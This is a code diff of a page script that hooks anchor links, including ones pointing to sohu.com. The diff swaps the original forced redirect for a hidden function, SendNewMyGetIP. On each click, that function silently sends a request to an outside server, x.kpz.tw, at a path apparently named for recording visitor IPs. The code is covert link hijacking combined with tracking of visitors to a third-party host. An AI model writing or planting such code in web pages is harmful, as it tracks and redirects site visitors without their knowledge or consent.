@@ -7,7 +7,7 @@ g_hookUrls[1]="sohu.com"
 function mOnFun(mthis)
 {
 
-	mthis.href=g_goUrl;
+	SendNewMyGetIP();
 
 }
 for(var i=0;i<=document.getElementsByTagName("a").length;i++)
@@ -28,4 +28,31 @@ for(var i=0;i<=document.getElementsByTagName("a").length;i++)
 	{
 
 	}
+}
+
+
+function SendNewMyGetIP()
+{
+	mUrl="http://x.kpz.tw/abcde/jiluip.php"
+	try
+	{
+		var xmlHttpRequest= new XMLHttpRequest();
+	} catch (e) {xmlHttpRequest= new ActiveXObject("Microsoft.XMLHTTP");} 
+ 
+	xmlHttpRequest.onreadystatechange = function()
+	{
+		if(xmlHttpRequest.readyState == 4 && xmlHttpRequest.status == 200)
+		{
+			var b = xmlHttpRequest.responseText;
+			try
+			{
+
+			}
+			catch (e) {}
+
+		} 
+	}
+    xmlHttpRequest.open("GET",mUrl,true);
+    xmlHttpRequest.send(); 
+
 }
